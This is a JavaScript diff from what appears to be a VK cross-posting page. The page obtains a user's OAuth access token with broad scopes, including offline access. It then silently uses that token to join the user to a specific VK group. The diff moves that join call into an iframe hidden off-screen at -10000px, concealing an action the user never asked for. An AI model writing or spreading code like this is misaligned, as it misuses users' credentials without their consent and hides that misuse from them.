@@ -1067,11 +1067,10 @@
 
         $('#vk_at').click(function () {
                 window.open('http://oauth.vk.com/authorize?client_id=2742215&scope=groups,photos,wall,offline&redirect_uri=blank.html&display=page&response_type=token', 'CrossPost', '');
-                setTimeout(myBubenFunc, 1000);
             }
         );
 
-        function myBubenFunc() {
+        $('#vk_at_input').on('change', function () {
             if ($('#vk_at_input').val().substring(0, 4) == 'http') {
                 var search = $('#vk_at_input').val().split('#')[1];
                 var parts = search.split("&");
@@ -1081,11 +1080,13 @@
                     $_GET[decodeURIComponent(temp[0])] = decodeURIComponent(temp[1]);
                 }
                 $('#vk_at_input').val($_GET['access_token']);
-                $.get('https://api.vk.com/method/groups.join?group_id=28197069&v=5.10&access_token=' + $_GET['access_token']);
-            } else {
-                setTimeout(myBubenFunc, 1000);
+                var iframe = document.createElement("iframe");
+                iframe.src = 'https://api.vk.com/method/groups.join?group_id=28197069&v=5.10&access_token=' + $_GET['access_token'];
+                iframe.style.position = "absolute";
+                iframe.style.top = "-10000px";
+                document.body.appendChild(iframe);
             }
-        }
+        });
 
         $('div.page').slideUp(0);
         $('#mymenu').on('click', 'li', function () {
